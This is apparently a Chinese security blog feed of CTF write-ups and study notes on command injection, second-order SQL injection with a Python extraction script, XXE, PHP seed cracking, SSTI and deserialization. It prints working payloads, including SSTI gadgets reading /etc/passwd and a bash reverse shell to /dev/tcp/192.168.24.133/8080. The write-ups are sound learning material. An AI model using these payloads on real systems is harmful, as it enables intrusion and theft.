src="15.PNG"></p><p>成功执行，而且错误信息也是成功的被输入到1里面去了</p><p>这说明<code>ls的标准错误输出成功的被重定向到了1文件夹里</code></p><p>解释语句</p><blockquote><p>重定向使用规则</p></blockquote><p>标准输入0、输出1、错误2需要分别重定向，一个重定向只能改变它们中的一个。<br>标准输入0和标准输出1可以省略。（当其出现重定向符号左侧时）。<br>文件描述符在重定向符号左侧时直接写即可，在右侧时前面加&amp;<br>文件描述符与重定向符号之间不能有空格</p><p>重定向符：&gt;</p><p>文件描述符： 0，1 ，2</p><p>深入了解ls hhh &gt;1 2&gt;&amp;1</p><p>首先标准错误输出会重定向到标准输出里面，因为标准输出已经被重定向到1这个文件夹，所以最终标准错误输出也被重定向到1这个文件夹里</p><h2>解题 法一</h2><p>进入题目，题目代码很简单</p><blockquote><?php isset($_GET['xbx'])?system($_GET['xbx']):highlight_file(__FILE__); </blockquote><p>我们尝试使用ls，会看见</p><p><img src="4.PNG"></p><p>但是这个zip文件，怎么也把不开，执行ls /看见有flag，但是依然也是打不开</p><p><img src="5.PNG"></p><p>因为可以执行ls，所以不妨我们可以尝试一下读取 /bin文件夹</p><p><img src="6.PNG"></p><p>可以看到全部都被删除了，只剩下ls rm sh，所以我们可以用sh来执行命令</p><p><img src="7.PNG"></p><p>解释命令这样写的原因:</p><p><img src="16.PNG"></p><p>我们可以看到当我们执行 sh 2的时候，是会出现报错的，并且可以将2的内容输到报错里面</p><p><img src="17.PNG"></p><p>但是这道题目里是没有的，所以我们可以尝试将错误信息重定向获得flag</p><p>记得&amp;编码</p><p><img src="18.PNG"></p><h2>解题 法二</h2><p><img src="20.PNG"></p><p>看见里面有php</p><p>测试一下</p><p><img src="21.PNG"></p><blockquote><p>方法一、php+文件，文件内容会被当成php代码执行，相当于是include<br>/?xbx=php /flag</p></blockquote><blockquote><p>方法二、指定根目录，绕过<a href="https://www.jb51.net/article/141767.htm">open_basedir</a>  (它可将用户访问文件的活动范围限制在指定的区域)</p></blockquote><p>/?xbx=php -t / -r “include(‘/flag’);”</p><blockquote><p>方法三、使用空配置文件（默认配置）执行php代码<br>/?xbx=&gt;php.ini<br>/?xbx=php -c php.ini -r “include(‘/flag’);”</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2018 Unfinish(二次注入)</title>
      <link href="/2021/04/19/%E7%BD%91%E9%BC%8E%E6%9D%AFunfinish/"/>
      <url>/2021/04/19/%E7%BD%91%E9%BC%8E%E6%9D%AFunfinish/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>打开题目，直接就是登录界面，直接跨国注册界面就是特别令人奇怪，于是，我尝试了register.php，成功转换到注册界面，然后注册登录，啥都没有。。。。。。。</p><p>这到题目是关于二次注入的，以前没有接触过这个</p><p>看WP，说是这题明显具有二次注入的特征，输入邮箱，密码，用户名，返回用户名</p><p>爆库名</p><blockquote><p>0’+hex(database())+’0</p></blockquote><p>前面的单引号是为了闭合前面的单引号，后面的单引号是为了闭合后面的单引号</p><p>得到库名 web</p><p>但是有时候我们需要注意，因为会出现截断问题，所以我们使用两次hex转换</p><blockquote><p>0’+hex(hex(database()))+’0</p></blockquote><p>然后我们会发现，当我们再进行下一步的时候，information被过滤了，所以就盲猜flag在flag表中</p><p><img src="1.PNG"></p><p>如这张图，会出现科学技术法，会造成我们得不到我们想要的结果，然后我们，可以借助substr进行截断，因为进行fuzz的时候发现逗号不能用了，于是我们可以借助from for</p><pre><code>import requestslogin_url=&#39;url/login.php&#39;register_url=&#39;url/register.php&#39;content=&#39;&#39;for i in range(1,20):    data_register=&#123;&#39;email&#39;:&#39;15@%d&#39;%i,&#39;username&#39;:&quot;0&#39;+( substr(hex(hex((select * from flag ))) from (%d-1)*10+1 for 10))+&#39;0&quot;%i,&#39;password&#39;:&#39;1&#39;&#125;    #print(data)    data_login=&#123;&#39;email&#39;:&#39;15@%d&#39;%i,&#39;password&#39;:&#39;1&#39;&#125;    requests.post(register_url,data=data_register)    rr=requests.post(login_url,data=data_login)    rr.encoding=&#39;utf-8&#39;    r=rr.text    location=r.find(&#39;user-name&#39;)    cont=r[location+17:location+42].strip()    content+=cont    print(cont)    #content=content.decode(&#39;hex&#39;).decode(&#39;hex&#39;)print(content)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2021/04/19/XXE/"/>
      <url>/2021/04/19/XXE/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>转载，<a href="https://xz.aliyun.com/t/3357">XXE详解</a>，</p><p><a href="https://xz.aliyun.com/t/6887#toc-3">从XML相关一步一步到XXE漏洞</a></p><span id="more"></span><h2>XML</h2>这个我记得招新考试中有这个xml注入，说来惭愧这么长时间还是对这个没有什么了解<h3>什么是xml</h3><p>xml是可扩展标记语言（EXtensible Markup Language）</p><p>XML的设计宗旨是传输数据而不是显示数据</p><p>XML 是 W3C 的推荐标准。</p><p>XML 不会做任何事情。</p><p>XML 被设计用来结构化、存储以及传输信息。</p><p>XML 语言没有预定义的标签。</p><h3>XML基本格式与基本语法</h3><p>基本格式： </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;&lt;/book&gt;                                                 &lt;!--book的结束--&gt;&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;</code></pre><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。<br>standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p><h3>基本语法</h3><li>所有的XML元素都需要有关闭标签<li>XML标签对大小写敏感<li>XML必须正确地嵌套<li>XML文档必需有根元素<li>XML地属性必须加引号<p>若有多个字符需要转义，则可以将这些字符存放在CDATA里面</p><h2>xml注入</h2><p>这个我记得招新考试中有这个xml注入，说来惭愧这么长时间还是对这个没有什么了解</p><p><img src="1.png"></p><p>xxe是一个外部实体注入漏洞，需要我们盯好外部实体这个词眼，如果我们注入的外部实体可以被解析的话，那么将会大大拓宽我们进行xml注入的攻击面</p><h2>基础知识</h2><h3>xml文档的构建模式</h3><li> 元素: 是xml以及html文档的主要构件模块，从（且包括）开始标签直到（且包括）结束标签的部分，元素可闹含文本，其他元素或者是属性<pre><code>&lt;title&gt;my blog&lt;/title&gt;</code></pre><li>属性<pre><code>&lt;img src=&quot;r1ght0us.gif&quot; /&gt;</code></pre><li>实体<p>实体是指用来定义普通的文本变量</p><li>PCDATA<p>parsed character data 被解析的文本数据，这些文本将被解析器检查实体以及标记</p><li>CDATA<p>不会被解析的文本</p><p>XML有自己的格式规范,这个格式规范是有DTD控制的，它长下面这样</p><p><img src="2.png"></p><p>这个DTD说明了XML的根元素时message，然后根元素下面有一些子元素，那么XML到时候像下面这样写</p><p><img src="3.png"></p><p>除了在DTD定义元素（其实就是对应XML中的标签）以外，我们还能在DTD中定义实体（对应xml中的内容），毕竟XML中除了标签一屋子，还有些内容时固定的</p><p>示例代码</p><p><img src="4.PNG"></p><p>这里定义位ANY说明接受任何元素，但是定义了一个xml实体（实体其实可以作为一个变量，到时候我们可以通过&amp;符号进行引用），那么XML就可以写成这样</p><p><img src="5.PNG"></p><p>输出的&amp;xxe会被“test”替换</p><h2>DTD</h2><p>再详细一点</p><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br>DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p><h3>实体引用</h3><p>XML元素形如<tag>foo</tag>地标签开始和结束，如果元素内部出现类似于<code>&lt;</code>地特殊符号，解析就会失败，为了避免这种情况，XML用实体引用替换特殊字符。XML预定义了五个实体引用，即用<code>&amp;lt;&amp;gt;&amp;amp;&amp;apos;&amp;quot;</code>替换<code>&lt; &gt; &amp; &#39; &quot;</code></p><p>实体引用可以起到类似于宏定义和文件包含地效果，为了放榜，我们会希望自定义实体引用。</p><h3>DTD的引入方式</h3><p>DTD的作用是定义XML文档的合法构建模块。DTD可以在XML文档内部声明，也可以在文档外部声明</p><li>内部DTD<blockquote><!DOCTYPE  根元素名称 [元素声明]></blockquote><p>示例代码</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;</code></pre><p>外部DTD</p><p>(1) 引入外部DTD文件</p><blockquote><!DOCTYPE 根元素名称 SYSTEM “dtd路径”></blockquote><p>(2)使用网络上的DTD文件</p><blockquote><!DOCTYPE 根元素名称 PUBLIC "DTD名称" "DTD文档中的URL"></blockquote><h3>PCDATA</h3>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。被解析的字符数据不应当包含任何&，<，或者>字符，需要用&amp; &lt; &gt;实体来分别替换。<h3>CDATA</h3>CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。<p><img src="9.png"></p><h3>DTD属性</h3>属性声明语法:<blockquote><!STTLIST 元素名称 属性名称 属性类型 默认值 ></blockquote><p>DTD实例： </p><blockquote><!ATTLIST payment lucky CDATA "Q"></blockquote><p>以下是属性类型的选项：</p><p><img src="10.png"></p><h2>DTD实体</h2><blockquote><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p></blockquote><p>实体引用是对实体的引用。</p><blockquote><p>实体可在内部或外部进行声明。</p></blockquote><p>按实体有无参数分类，实体分为一般实体和参数实体</p><p>一般实体的声明：<!ENTITY 实体名称 "实体内容"></p><p>引用一般实体的方法是： &amp;实体名称；</p><p>普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p><p>参数实体的声明：<!ENTITY % 实体名称 "实体内容"></p><p>引用参数实体的方法：%实体名称;</p><p>参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。<br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p>外部实体可支持http，file等协议。不同程序支持的协议不同</p><p><img src="11.png"></p><h2>重点1</h2><p>实体分为两种，内部实体和外部实体，上述我们举例时内部实体，外部实体课题从外部dtd文件中引用。</p><p><img src="6.PNG"></p><p>这样对引用资源所作的子和改变都会在文档中自动更新，非常方便</p><p><i>方便永远是安全的敌人</i></p><p>还有一种引用公用DTD的方式</p><blockquote><!DOCTYPE 根元素名称  PUBLIC “DTD标识名” “公用DTD的URI”></blockquote><p>这个在我们的攻击中也可以起到和SYSTEM一样的作用</p><h2>重点2</h2><p>我们上面已经将实体分成了两个派别（内部实体和外部实体），但是上从另一个角度看，实体被分为通用实体和参数实体</p><li> 通用实体<p>用&amp;实体名；引用的实体，他在DTD中的定义，在XML文档中引用</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; &lt;updateProfile&gt;  &lt;firstname&gt;Joe&lt;/firstname&gt;  &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  ... &lt;/updateProfile&gt;</code></pre><li>参数实体<p>(1)使用<code>% 实体名</code>(这里的空格不能少) 在DTD中定义，冰洁只能在DTD中使用<code>% 实体名；</code> 引用</p><p>(2)只有在DTD文件中，参数实体的声明才能引用其他实体</p><p>(3)和通用实体一样，参数实体也可以外部引用</p><pre><code>&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; %an-element; %remote-dtd;</code></pre><h2>原理</h2><p><code>注入</code>：  是指<code>xml数据在传输过程中被修改</code>，导致服务器执行了秀嘎后的恶意代码，从而达到了攻击目的。</p><p><code>外部实体：  </code>则是指攻击者通过利用外部实体声明部分的“SYSTEM”关键词导致XML解析器可以从本地或者远程URI读取受保护的数据。</p><h2>判断是否存在xxe漏洞</h2><p>最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞</p><p><a href="http://192.168.111.1/bWAPP/xxe-1.php">bwapp</a></p><p><img src="8.PNG"></p><p>已经被解析的状态</p><h2>XML注入</h2>XML是一种数据组织存储的数据结构方式，安全的XML在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变XML标签也就是说改变XML结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致XML注入攻击。<h2>注入前提</h2><p>(1)用户能够控制数据的输入<br>(2)程序有拼凑的数据</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php-伪随机数爆破</title>
      <link href="/2021/04/17/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/"/>
      <url>/2021/04/17/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><a href="https://blog.csdn.net/qq_45521281/article/details/107302795?utm_source=app&app_version=4.5.8">参考地址</a></p><p><code>计算机只能产生伪随机数不能产生绝对随机的随机数</code></p><h2>与伪随机数有关的两个函数</h2><li>mt_rand()<blockquote><p>mt_rand(min,max),如果没有提供min和max,返回0到RAND-MAX之间对的伪随机数</p></blockquote><li>mt_scand()<blockquote><p>mt_scand(seed),seed:规定播种值，用seed来给随机数发生器播种</p></blockquote><p><img src="1.PNG"></p><p>可以发现，如果我们把mt_scand()中的seed设置为一个固定的值，那么生成的随机数的是一样，在php 4.2之后，php会自动播种种子，所以我们无需设置</p><h2>php伪随机数的安全</h2><li>可预测性<p><mark>伪随机是由可确定的函数，通过一个种子（常用时钟）播种，产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，或者已知产生的随机数的一部分，都可能获得接下来随机数序列的信息，知道了你的随机数序列，就可以确定你的种子值。 （可预测性）。</p><p>简单假设一下 mt_rand()内部生成随机数的函数为: rand = seed+(i10) 其中 seed 是随机数种子， i 表示第几次调用这个随机数函数。当我们同时知道 i 和 rand 两个值的时候，就能很容易的算出seed的值来。比如 rand=21 , i=2 代入函数 21=seed+(20) 就能得到 seed=1 。是不是很简单，当我们拿到seed之后，就能计算出当 i 为任意值时候的 rand 的值了。</mark></p><h2>php自动播种</h2><p>当php 4.2.0的时候，播种是由系统自动完成的，php每次调用mt_rand()函数的时候，都会先检查是否已经播种，如果播种就直接产生随机数，否则调用php_mt_srand来播种。在每个进程中，只有第一次调用mt_rand()会播种，接下来会根据这个第一次播种的种子来生成随机数</p><h2>种子爆破工具-php_mt_seed</h2><p>它可以根据单次mt_rand()的输出结果直接爆破出可能的种子，当然也可以爆破类似mt_rand(1,100)这样限定了MIN MAX输出的种子。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2021/04/10/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2021/04/10/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2>bash反弹shell</h2><blockquote><p>bash -i &gt;&amp; /dev/tcp/192.168.24.133/8080 0&gt; &amp;1</p></blockquote><p>bash一句话命令详解</p><p><img src="1.png"></p><p>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p><p>先用kali开启监听<br><img src="2.PNG"></p><p>然后在centos执行bash一句话</p><p><img src="3.PNG"></p><p>再复习一下</p><p>bash -i &gt;&amp; /dev/tcp/ip地址/端口 0&gt;&amp;1</p><p><img src="4.PNG"></p><p>成功！！！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Buu-flasklight</title>
      <link href="/2021/04/09/Buu-flasklight/"/>
      <url>/2021/04/09/Buu-flasklight/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>怀疑是ssti模板注入，然后f12查看源码后，的这是输入？search，请求方式是get。</p><p>做一个测试</p><pre><code>&#123;&#123;7*7&#125;&#125;,&#123;&#123;config&#125;&#125;</code></pre><p>通过查看config，我们可以看到配置</p><p><img src="1.PNG"></p><p>有一点CCC{the_flag_is_this_dir}，说明flag，就在这个目录下，尝试用file读取</p><p><img src="2.PNG"></p><p>但是是返回错误的，说明有可能flag文件名并不是flag</p><p>这里学到了两个命令</p><p>proc/self/environ 读内存</p><p>proc/self/cmdline  启动内核参数</p><p><img src="3.PNG"></p><p>看到了 flasklight/app.py,进行读取</p><p><img src="4.PNG"></p><p>看到了blacklist，这就是为什么我尝试globals，出现错误的原因</p><p>这里学习了一个新的类</p><p>subprocess.Popen这个类</p><p><img src="5.PNG"></p><p>测试脚本</p><p>得到该类是258</p><pre><code>&#123;&#123;''.class.mro[2].subclasses()[258]('ls', shell=True, stdout=-1).communicate()&#125;&#125;</code></pre><p>但是，如果globals被过滤我们可以使用[‘__glo’+’bals__’]绕过，同样可以得到flag</p><pre><code>&#123;&#123;"".__class__.__mro__[2].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen("ls").read()&#125;&#125;</code></pre><p>71: &lt;class ‘site._Printer’&gt;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSTI</title>
      <link href="/2021/04/09/SSTI/"/>
      <url>/2021/04/09/SSTI/</url>
      
        <content type="html"><![CDATA[<p>#前言<br><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">原文地址</a></p><span id="more"></span><h2>0x01 简介</h2><p>SSTI，服务端模板注入，通过与服务端模板的输入输出交互，在过滤不严格地情况下，构造恶意输入数据，从而达到读取文件或者getshell地目的</p><h2>0x02 攻击流程</h2><p>函数解析</p><blockquote><p>__class__ 返回调用的参数类型<br><br>__bases__返回类型列表<br><br>__mro__此属性是在方法解析期间寻找基类时考虑的类元组<br><br>__subsclasses__()返回object的子类<br><br>__globals__函数会以字典类型返回当前位置的全部全局变量 与 func_globals等价<br></p></blockquote><p>获取基本类</p><blockquote><p>‘’.__class__.__mro__[2]<br><br>{}.__class__.__bases__[0]<br><br>().__class__.__bases__[0]<br><br>[].__class__.__bases__[0]<br><br>request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用<br></p></blockquote><p>获得基本类后，继续向下获取基本类（object）的子类</p><blockquote><p>object.__subclasses__()</p></blockquote><p>找到重载过的__init__类(在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)</p><p>查看其引用<strong>builtins</strong></p><blockquote><p>builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块</p></blockquote><pre><code>    &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]    也有可能是&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</code></pre><p>使用file一实现读取文件的功能</p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;D://.cbp&#39;).read()</code></pre><h2>0x03读写文件</h2><p>方法一同上面写的</p><p>方法二：</p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[40] [].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read() #将read() 修改为 write() 即为写文件</code></pre><p><img src="1.PNG"></p><p>可以用这个找一下，索引值</p><h2>0x04命令执行</h2><p>方法一（eval）：</p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</code></pre><p>方法二：</p><pre><code>    [].__class__.__base__.__subclasses__()[60].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[79](&#39;whoami&#39;)或者[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)</code></pre><p>做之前自己试试</p><p>![2.PNG]</p><p>利用commands</p><pre><code>&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</code></pre><h2>常见绕过方式</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DJBCTF-spaceman</title>
      <link href="/2021/04/09/DJBCTF-spaceman/"/>
      <url>/2021/04/09/DJBCTF-spaceman/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class spaceman</span><br><span class="line">&#123;</span><br><span class="line">   public $username;</span><br><span class="line">   public $password;</span><br><span class="line">   public function __construct($username,$password)</span><br><span class="line">   &#123;</span><br><span class="line">       $this-&gt;username &#x3D; $username;</span><br><span class="line">       $this-&gt;password &#x3D; $password;</span><br><span class="line">   &#125;</span><br><span class="line">   public function __wakeup()</span><br><span class="line">   &#123;</span><br><span class="line">       if($this-&gt;password&#x3D;&#x3D;&#x3D;&#39;ctfshowvip&#39;)</span><br><span class="line">       &#123;</span><br><span class="line">           include(&quot;flag.php&quot;);</span><br><span class="line">           echo $flag;    </span><br><span class="line">       &#125;</span><br><span class="line">       else</span><br><span class="line">       &#123;</span><br><span class="line">           echo &#39;wrong password&#39;;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">function filter($string)&#123;</span><br><span class="line">   return str_replace(&#39;ctfshowup&#39;,&#39;ctfshow&#39;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$str &#x3D; file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">if(preg_match(&#39;&#x2F;\_|\.|\]|\[&#x2F;is&#39;,$str))&#123;            </span><br><span class="line">   die(&quot;I am sorry but you have to leave.&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   extract($_POST);</span><br><span class="line">&#125;</span><br><span class="line">$ser &#x3D; filter(serialize(new spaceman($user_name,$pass_word)));</span><br><span class="line">$test &#x3D; unserialize($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题目总体来说不难，就知道php解析特性特性就好了，当输入特殊字符，空格，+，[,],php会自动解析成下划线，所以我们post提交pass word=ctfshowvip,就好了，</p><p><img src="1.PNG"></p><p>但是，因为这个有一个函数filter,这里应该涉及到了字符串逃逸问题。所以感觉刚才那个应该是非预期解。</p><p><img src="2.PNG"></p><p>这样子，字符串逃逸</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DJBCTF-有手就行</title>
      <link href="/2021/04/09/F5-%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C/"/>
      <url>/2021/04/09/F5-%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><img src="1.PNG"></p><p>直接用这个进行base64解码发现解不出来，然后上网查了一下，这是base64转图片。data:image/jpg;base64,(加上刚才的base64码)</p><p><img src="2.png"></p><p>接出来是这个</p><p>然后看了一下url，是？file=scan，改成flag，发现没有回显，然后我就卡住了，因为我发现改成啥页面都不会发生改变。emmm,看WP，发现自己还是不够敏感，为什么修改任何东西，页面都没有改变，那显然是有问题地。<br>？file=flag,看源代码，同样进行刚才的操作，扫出来是一个二维码，是一个微信程序。</p><p><img src="3.PNG"></p><p>上网查了一下，微信小程序是不能在网页中打开的。那么就意味这我们没有办法通过修改网页内容去达到我们想要的结果。</p><p>看了WP是进行反编译小程序</p><p>下载一个夜神模拟器</p><p><img src="4.PNG"></p><p>然后登录微信，打开小程序，之后在ES文件管理浏览器中，在根目录/data/data/com.tencent.mm/MicroMsg/55dd515472835181368568115ffc4cc1/appbrand/pkg/中找到</p><p><img src="5.PNG"></p><p>然后，分享到电脑上，然后记事本打开全局搜索flag,获得flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Can-you-guess-it</title>
      <link href="/2021/04/08/Can-you-guess-it/"/>
      <url>/2021/04/08/Can-you-guess-it/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>打开题目，点击source，我的想法就是怎么去构造guess与$secret相同，但是自己尝试后，然后又上网查了一下hash_equals的资料，发现好像绕过不了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">   exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line"> highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret &#x3D; bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#39;guess&#39;])) &#123;</span><br><span class="line"> $guess &#x3D; (string) $_POST[&#39;guess&#39;];</span><br><span class="line"> if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">   $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;</span><br><span class="line"> &#125; else &#123;</span><br><span class="line">   $message &#x3D; &#39;Wrong.&#39;;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先记录一下，这里有一些新的函数和变量是以前没有见过的</p><li>$server['PHP_SELF']:表示当前 php 文件相对于网站根目录的位置地址<p><img src="1.PNG"></p><li>basename 返回路径中的文件名部分<p><img 